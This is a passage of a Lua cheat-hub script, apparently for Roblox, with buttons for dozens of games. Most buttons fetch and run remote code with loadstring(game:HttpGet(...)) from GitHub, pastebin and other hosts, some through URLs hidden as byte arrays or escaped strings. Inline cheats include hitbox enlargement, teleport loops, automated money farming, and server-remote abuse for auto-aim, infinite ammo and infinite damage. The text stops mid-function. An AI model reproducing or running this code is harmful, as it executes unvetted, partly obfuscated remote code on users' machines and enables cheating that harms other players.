    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/Pi-script-Hebeitangxian.lua"))()
    end)
end)

Button(Tab37, "卡车刷钱", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoyi-boop/-/refs/heads/main/YItangxian.lua",true))()
    end)
end)

Button(Tab37, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.lua"))()
    end)
end)

Button(Tab37, "脚本2", function()
    pcall(function()
    getgenv().Leng="冷脚本QQ群815883059" loadstring(game:HttpGet("https://raw.githubusercontent.com/odhdshhe/Tang-County-Hebei-Province/refs/heads/main/LENG%20Tang%20County%2C%20Hebei%20Province.txt"))()
    end)
end)

-- 被遗弃 (Tab38)
Button(Tab38, "脚本1", function()
    pcall(function()
    loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
    end)
end)

Button(Tab38, "脚本2", function()
    pcall(function()
    loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/ivannetta/ShitScripts/refs/heads/main/forsaken.lua")))()
    end)
end)

Button(Tab38, "汉化脚本（卡密：Samuelspizzatrip", function()
    pcall(function()
    getgenv().XiaoPi="被遗弃-B0bby[汉化版]" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/187ec501507e956200e0741a7bc38ca1cd83973f/%E8%A2%AB%E9%81%97%E5%BC%83B0bby%E6%B1%89%E5%8C%96%20(1).lua"))()
    end)
end)

Button(Tab38, "脚本3（卡密:BOBBYHUBKEYWJJEBEKEI1827272）", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub"))()
    end)
end)

-- 骨折模拟器 (Tab39)
Button(Tab39, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet('https://pastebin.com/raw/5rEAVmcC'))()
    end)
end)

Button(Tab39, "脚本2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingResources/GamingResources-Script-Hub/main/Key%20System", true))()
    end)
end)

-- 地下城任务 (Tab40)
Button(Tab40, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/StepBroFurious/Script/main/FuriousFall.lua"))()
    end)
end)

Button(Tab40, "脚本2", function()
    pcall(function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/hngamingroblox/659adbebad6a9b3a07527e5f7e446d66/raw"))()   
    end)
end)

-- 极速传奇 (Tab41)
Button(Tab41, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\111\121\115\99\112\47\98\101\116\97\47\109\97\105\110\47\37\69\57\37\56\48\37\57\70\37\69\53\37\66\65\37\65\54\37\69\55\37\56\50\37\66\56\37\69\56\37\66\53\37\66\55\46\108\117\97'))()
    end)
end)

-- 一路向西 (Tab42)
Button(Tab42, "请先加入Na1Xi群组", function()
    pcall(function()
    loadstring(game:GetObjects("rbxassetid://10040701935")[1].Source)()
    end)
end)

Button(Tab42, "脚本1", function()
    pcall(function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Drifter0507/scripts/main/westbound"),true))()
    end)
end)

-- 汽车经销商大亨 (Tab43)
Button(Tab43, "脚本1（会覆盖）", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/Car%20Dealership%20Tycoon.lua"))()
    end)
end)

Button(Tab43, "汽车经销商大亨2", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.md"))()
    end)
end)

-- 兵工厂 (Tab44)
Button(Tab44, "兵工厂1", function()
    pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/2YdrWHxV/raw"))()
    end)
end)

Button(Tab44, "兵工厂2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FurkUltra/UltraScripts/main/arsenal",true))()
    end)
end)

Button(Tab44, "兵工厂自瞄", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/main/无：'))()
    end)
end)

Button(Tab44, "兵工厂子弹追踪", function()
    pcall(function()
    function getplrsname() for i,v in pairs(game:GetChildren()) do if v.ClassName == "Players" then return v.Name end end end local players = getplrsname() local plr = game[players].LocalPlayer coroutine.resume(coroutine.create(function() while wait(1) do coroutine.resume(coroutine.create(function() for _,v in pairs(game[players]:GetPlayers()) do if v.Name ~= plr.Name and v.Character then v.Character.RightUpperLeg.CanCollide = false v.Character.RightUpperLeg.Transparency = 75 v.Character.RightUpperLeg.Size = Vector3.new(21,21,21) v.Character.LeftUpperLeg.CanCollide = false v.Character.LeftUpperLeg.Transparency = 75 v.Character.LeftUpperLeg.Size = Vector3.new(21,21,21) v.Character.HeadHB.CanCollide = false v.Character.HeadHB.Transparency = 75 v.Character.HeadHB.Size = Vector3.new(21,21,21) v.Character.HumanoidRootPart.CanCollide = false v.Character.HumanoidRootPart.Transparency = 75 v.Character.HumanoidRootPart.Size = Vector3.new(21,21,21) end end end)) end end))
    end)
end)

Button(Tab44, "兵工厂汉化", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/Tbao.lua"))()
    end)
end)

Button(Tab44, "兵工厂隐身", function()
    pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/ArsenalGodmode.lua"))()
    end)
end)

-- By手腕 (Tab45)
Button(Tab45, "掰手腕", function()
    pcall(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/99d16edc79729a038994f85ce7335971.lua"))()
    end)
end)

Button(Tab45, "掰手腕2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZhenX201/FE-Infinite-Money-All-Stats/main/source"))()
    end)
end)

Button(Tab45, "无卡密1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KrzysztofHub/script/main/loader.lua"))()
    end)
end)

Button(Tab45, "无卡密2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zicus-scripts/SkullHub/main/Loader.lua"))()
    end)
end)

Button(Tab45, "无卡密3", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/wrestle2/main/armsim"))()
    end)
end)

-- 超级足球联赛 (Tab46)
Button(Tab46, "超级足球联赛1", function()
    pcall(function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/xtrey10x/xtrey10x-hub/main/neo")()
    end)
end)

-- 战争大亨 (Tab47)
Button(Tab47, "战争大亨1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaguya11/KaguHubRework/refs/heads/main/Scripts/Loader.lua", true))("t.me/rbxscript_robot")
    end)
end)

Button(Tab47, "战争大亨无限子弹", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XOTRXONY/Wartycoon/main/ZZDH.lua"))()
    end)
end)

Button(Tab47, "战争大亨2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/WarTycoon", true))()
    end)
end)

Button(Tab47, "战争大亨3", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/WarTycoon'))()
    end)
end)

Button(Tab47, "战争大亨4", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/War-Tycoon/main/Script"))()
    end)
end)

Button(Tab47, "战争大亨5", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vortex194/main/main/oilwarfare", true))()
    end)
end)

Button(Tab47, "战争大亨6", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0wartycoon", true))()
    end)
end)

Button(Tab47, "战争大亨7", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/megamoeus/UI-Engine-V2/main/OWTPublic"))()
    end)
end)

Button(Tab47, "战争大亨8", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/WarTycoon", true))()
    end)
end)

Button(Tab47, "战争大亨9", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1007, 46, -32.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-986, 44, -29.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-932, 44, -26.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-908, 44, -26.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-909, 46, -5.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1006, 46, -5.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-987, 44, -2.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-908, 45, -6.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-935, 46, -6.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1028, 46, -49.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1051, 46, -49.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1050, 42, -69.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1022, 43, -71.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-998, 43, -68.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-973, 43, -69.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-969, 44, -91.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-994, 45, -88.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1025, 47, -10.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1083, 47, -118.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1080, 45, -138.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1053, 43, -140.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1057, 47, -118.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-996, 44, -150.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-972, 47, -150.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-976, 49, -127.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-915, 44, -125.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-887, 43, -126.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-890, 45, -105.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-916, 46, -104.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1001, 49, -129.)
wait(0)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1026, 47, -10.)
wait(0)
    end)
end)

-- 吃掉世界 (Tab48)
Button(Tab48, "吃掉世界1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/VIP/refs/heads/main/Eat%20the%20World.lua", true))()
    end)
end)

Button(Tab48, "吃掉世界2", function()
    pcall(function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/jkloviv/moon/refs/heads/main/Remnant%20Star'),true))()
    end)
end)

-- 隐藏尸体 (Tab49)
Button(Tab49, "隐藏尸体1（要卡密）", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/x2zu/loader/main/scripts.lua"))()
    end)
end)

-- 猎杀僵尸 (Tab50)
Button(Tab50, "猎杀僵尸1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kaisenlmao/loader/refs/heads/main/chiyo.lua"))()
    end)
end)

-- 建造汽车 (Tab51)
Button(Tab51, "建造汽车1", function()
    pcall(function()
    loadstring(game:HttpGet("https://ashlabs.me/api/game?name=Build-a-car.lua", true))()
    end)
end)

-- 原始追求/原始追击 (Tab52)
Button(Tab52, "脚本一", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScriptHub/MikeyHub-V2/main/Loader/Main"))()
    end)
end)

-- 攀爬与滑行 (Tab53)
Button(Tab53, "攀爬与滑行1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/ClimbandSlide"))()
    end)
end)

-- 拔出一把剑 (Tab54)
Button(Tab54, "拔出一把剑1", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/fanxx04/madbuk-loader/refs/heads/main/MadBuk-Loader/Mua'))()
    end)
end)

-- 暴力区 (Tab55)
Button(Tab55, "暴力区1", function()
    pcall(function()
    loadstring(game:HttpGet("https://singularityrblx.onrender.com/api/loader.lua"))()
    end)
end)

-- 邪恶的事情会发生什么 (Tab56)
Button(Tab56, "邪恶的事情会发生什么1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/refs/heads/main/SEWH.lua"))()
    end)
end)

-- 住宅大屠杀 (Tab57)
Button(Tab57, "住宅大屠杀1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Residence%20Massacre"))()
    end)
end)

-- 犯罪 (Tab58)
Button(Tab58, "犯罪脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/Kenny1.5.txt"))()
    end)
end)

-- 封锁战线 (Tab59)
Button(Tab59, "封锁战线1", function()
    pcall(function()
    loadstring(game:HttpGet('https://dyumra.psce.pw/dyhub-loader'))()
    end)
end)

-- 终极战场 (Tab60)
Button(Tab60, "终极战场1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nonamebtc/UBG/refs/heads/main/Elyos.lua"))()
    end)
end)

-- 最强的拳击模拟器 (Tab61)
Button(Tab61, "最强的拳击模拟器1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExtremeAntonis/extremehub/main/loader.lua"))()
    end)
end)

-- 排球传奇 (Tab62)
Button(Tab62, "排球传奇1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/raydjs/napoleonHub/refs/heads/main/src.lua"))()
    end)
end)

-- 竞争对手 (Tab63)
Button(Tab63, "竞争对手", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowBey01/SHWX-Team-Rise-Scripts/refs/heads/main/Games/Rise%20(Rivals).lua", true))()
    end)
end)

-- 柔术无限 (Tab64)
Button(Tab64, "柔术无限1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))()
    end)
end)

-- 超速射击 (Tab65)
Button(Tab65, "超速射击1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joshingtonn123/JoshScript/refs/heads/main/Syrexhubhypershot"))()
    end)
end)

-- 英雄战场 (Tab66)
Button(Tab66, "英雄战场1", function()
    pcall(function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/1craku/Test/refs/heads/main/Heroes%20Battlegrounds"))()
    end)
end)

-- 蓝色锁 (Tab67)
Button(Tab67, "蓝色锁1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BexruzScripts/Blue-lock-no-cd-reo-get-any-style-script.-WORKS-WITH-WORLD-CLASSES-/refs/heads/main/script.lua"))()
    end)
end)

-- 无标题的拳击 (Tab68)
Button(Tab68, "无题目的拳击", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/pid4k/scripts/refs/heads/main/untitledboxinggame.lua', true))()
    end)
end)

-- 越狱 (Tab69)
Button(Tab69, "越狱脚本1", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/BlitzIsKing/UniversalFarm/main/Loader/Regular'))()
    end)
end)

-- 生存战争 (Tab70)
Button(Tab70, "生存战争1", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWRewrite/main/NewMainScript.lua", true))()
    end)
end)

-- 停电 (Tab71)
Button(Tab71, "停电脚本1", function()
    pcall(function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/AuraHub-1/a0d7890b12acae3f9570617d34a8022d/raw/fb0b544964072db66297c5bb58c3a27c2a2ad3bc/KAuraB.lua"))()
    end)
end)

Button(Tab71, "停电脚本2", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dream77239/black-out/refs/heads/main/bl"))()
    end)
end)

-- 战争机器 (Tab72)
Button(Tab72, "刷钱（每秒100）", function()
    pcall(function()
    getgenv().WarMachinesExecuted = not getgenv().WarMachinesExecuted
getgenv().TweenTeleportTakenTime = 0.5
getgenv().Return = false
getgenv().AutoCooldown = true

if getgenv().WarMachinesExecuted then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 700, 265)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
    task.wait(0.0001)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
    getgenv().PlrVelocity = Instance.new("BodyVelocity")
    getgenv().PlrVelocity.Parent = game.Workspace.Characters[game.Players.LocalPlayer.Name].LowerTorso
    getgenv().PlrVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    Loops = 0
    Direction = 1
    while true do
        if not getgenv().WarMachinesExecuted then
            break
        end
        Loops = Loops + 1
        if Loops == 40 and getgenv().Return == true then
            Direction = Direction * -1
            Loops = 0
        else
            getgenv().PlrVelocity.Velocity = Vector3.new(0, 1250 * Direction, 0)
            task.wait(0.5)
        end
		getgenv().PlrVelocity.Velocity = Vector3.new(0,100,0)
		if game.Players.LocalPlayer.Character:GetAttribute("Overheat") ~= nil then
        	if getgenv().AutoCooldown and game.Players.LocalPlayer.Character:GetAttribute("Overheat") >= 900 then
        	    repeat
        	        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-830.82, 285, -509.22)
        	        if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	            game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        	            task.wait(0.1)
        	            game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        	            task.wait(0.1)
        	            if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	                game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
        	                task.wait(0.0001)
        	                game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
        	                task.wait(0.1)
        	                if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        	                    task.wait(0.1)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        	                    task.wait(0.1)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
        	                    task.wait(0.0001)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
        	                    task.wait(0.1)
        	                end
        	            end
        	        end
        	        task.wait(0.01)
        	    until game.Players.LocalPlayer.Character:GetAttribute("Overheat") <= 50 or not getgenv().WarMachinesExecuted
        	end
		end
        if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
            game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
                game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
                task.wait(0.0001)
                game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
                task.wait(0.1)
                if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                    task.wait(0.1)
                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
                    task.wait(0.1)
                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
                    task.wait(0.0001)
                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
                end
            end
        end
    end
else
    getgenv().PlrVelocity.Velocity = Vector3.new(0,0,0)
    game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart ,TweenInfo.new(getgenv().TweenTeleportTakenTime),{CFrame = CFrame.new(500, 700, 265)}):Play()
    task.wait(getgenv().TweenTeleportTakenTime)
    getgenv().PlrVelocity:Destroy()
	game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,-10,0)
	task.wait(.25)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 640, 265)
end
    end)
end)

-- 别碰按钮 (Tab73)
Button(Tab73, "别碰按钮1", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/imaboy12321/EEWE/main/eweweew"))()
    end)
end)

-- 在超级商店过夜生存 (Tab74)
Button(Tab74, "脚本一", function()
    pcall(function()
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Zephyr688/Lua-Script/refs/heads/main/UI"))()

local window = library:new("大司马｜在超市生活一周")

local Page = window:Tab("主要功能",'16060333448')

local Section = Page:section("功能",true)

Section:Toggle("自动收集食物", "", false, function(state)
    while state and task.wait() do
        for _,v in next,workspace.Map.Util.Items:GetChildren() do
            if v.ToolStats.ItemType.Value == "Food" then
                game:GetService("ReplicatedStorage").Remotes.RequestPickupItem:FireServer(v)
            end
        end
    end
end)

Section:Toggle("自动收集手电筒", "", false, function(state)
    while state and task.wait() do
        for _,v in next,workspace.Map.Util.Items:GetChildren() do
            if v.ToolStats.ItemType.Value == "Flashlight" then
                game:GetService("ReplicatedStorage").Remotes.RequestPickupItem:FireServer(v)
            end
        end
    end
end)

Section:Toggle("自动收集近战武器", "", false, function(state)
    while state and task.wait() do
        for _,v in next,workspace.Map.Util.Items:GetChildren() do
            if v.ToolStats.ItemType.Value == "Melee" then
                game:GetService("ReplicatedStorage").Remotes.RequestPickupItem:FireServer(v)
            end
        end
    end
end)
Section:Toggle("自动收集枪", "", false, function(state)
    while state and task.wait() do
        for _,v in next,workspace.Map.Util.Items:GetChildren() do
            if v.ToolStats.ItemType.Value == "Gun" then
                game:GetService("ReplicatedStorage").Remotes.RequestPickupItem:FireServer(v)
            end
        end
    end
end)

Section:Toggle("自动收集药品", "", false, function(state)
    while state and task.wait() do
        for _,v in next,workspace.Map.Util.Items:GetChildren() do
            if v.ToolStats.ItemType.Value == "Health" then
                game:GetService("ReplicatedStorage").Remotes.RequestPickupItem:FireServer(v)
            end
        end
    end
end)

Section:Toggle("自动装弹", "", false, function(state)
    while state and task.wait() do
        game:GetService("ReplicatedStorage").Remotes.Weapon.GunReloaded:FireServer(v, 1)
    end
end)

Section:Toggle("自动开枪", "", false, function(state)
    while state and task.wait() do
        for _, v in next, game.Players.LocalPlayer.Backpack:GetChildren() do
            if v:FindFirstChild("ToolStats") and v.ToolStats:FindFirstChild("Ammo") then
                for _,e in next,workspace.Enemies:GetChildren() do
                    if e.Humanoid.Health > 0 then
                        local BulletsPerShot = v.ToolStats.BulletsPerShot.Value
                        local DirectionTbl = {}
                        for i = 1, BulletsPerShot do
                            table.insert(DirectionTbl, Vector3.new(e.Head.Position.X, e.Head.Position.Y, e.Head.Position.Z).Unit)
                        end
                        local args = {
                            [1] = {
                                ["FiringPlayer"] = game:GetService("Players").LocalPlayer,
                                ["FiredTime"] = os.time,
                                ["FiringPlayerUserId"] = game.Players.LocalPlayer.UserId,
                                ["Origin"] = Vector3.new(game.Players.LocalPlayer.Character:GetPivot().Position),
                                ["UID"] = game.Players.LocalPlayer.UserId .. "_1",
                                ["WeaponInstance"] = v,
                                ["ThisBulletProperties"] = {
                                    ["BulletSpread"] = v.ToolStats.BulletSpread.Value,
                                    ["BulletsPerShot"] = v.ToolStats.BulletsPerShot.Value,
                                    ["BulletPenetration"] = v.ToolStats.BulletPenetration.Value,
                                    ["BulletSpeed"] = v.ToolStats.BulletSpeed.Value,
                                    ["FireSound"] = v.ToolStats.FireSound.Value,
                                    ["BulletSize"] = v.ToolStats.BulletSize.Value
                                },
                                ["DirectionTbl"] = DirectionTbl
                            }
                        }
                        game:GetService("ReplicatedStorage").Remotes.Weapon.GunFired:FireServer(unpack(args))
                    end
                end
            end
        end
    end
end)

Section:Toggle("修改超级枪", "", false, function(state)
    while state and task.wait() do
        for _,v in next,game.Players.Backpack:GetChildren() do
            if v.ToolStats:FindFirstChild("Ammo") then
                v.ToolStats.ReloadTime.Value = 0
                v.ToolStats.FireDelay.Value = 0
                v.ToolStats.Ammo.Value = math.huge
                v.ToolStats.Damage.Value = math.huge
            end
        end
    end
end)
Section:Toggle("无限体力和饥饿度", "", false, function(state)
    while state and task.wait() do
        game.Players.LocalPlayer.Character.CharacterData.MaxStamina.Value = math.huge
        game.Players.LocalPlayer.Character.CharacterData.MaxEnergy.Value = math.huge
        game.Players.LocalPlayer.Character.CharacterData.Energy.Value = game.Players.LocalPlayer.Character.CharacterData.MaxEnergy.Value
        game.Players.LocalPlayer.Character.CharacterData.Stamina.Value = game.Players.LocalPlayer.Character.CharacterData.MaxStamina.Value
    end
end)

Section:Toggle("夜晚自动躲避", "", false, function(state)
    while state and task.wait() do
        if game:GetService("ReplicatedStorage").GameInfo.TimeOfDay.Value == "Night" then
        oldpos = game.Players.LocalPlayer.Character:GetPivot().Position
        repeat task.wait()
        game.Players.LocalPlayer.Character:PivotTo(CFrame.new(306.18927001953125, 36.67450714111328, -519.2435913085938))
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
        until game:GetService("ReplicatedStorage").GameInfo.TimeOfDay.Value ~= "Night"
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
        else
            task.wait()
        end
    end
end)
    end)
end)

Button(Tab74, "传送汉堡", function()
    pcall(function()
        local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RootPart = Character:WaitForChild("HumanoidRootPart")

print("🍔 开始传送汉堡到玩家位置...")

-- 汉堡关键词列表
local burgerKeywords = {
    "burger", "hamburger", "cheeseburger", "汉堡", "汉堡包", "漢堡",
    "bigmac", "whopper", "cheese burger", "beef burger", "chicken burger"
}

-- 传送汉堡函数
local function teleportBurgersOnly()
    local burgerCount = 0
    
    print("🔍 扫描游戏中的汉堡...")
    
    -- 搜索整个workspace
    for _, item in pairs(Workspace:GetDescendants()) do
        if item:IsA("Part") or item:IsA("MeshPart") or item:IsA("UnionOperation") then
            local itemName = tostring(item.Name):lower()
            
            -- 检查是否是汉堡
            local isBurger = false
            
            for _, keyword in pairs(burgerKeywords) do
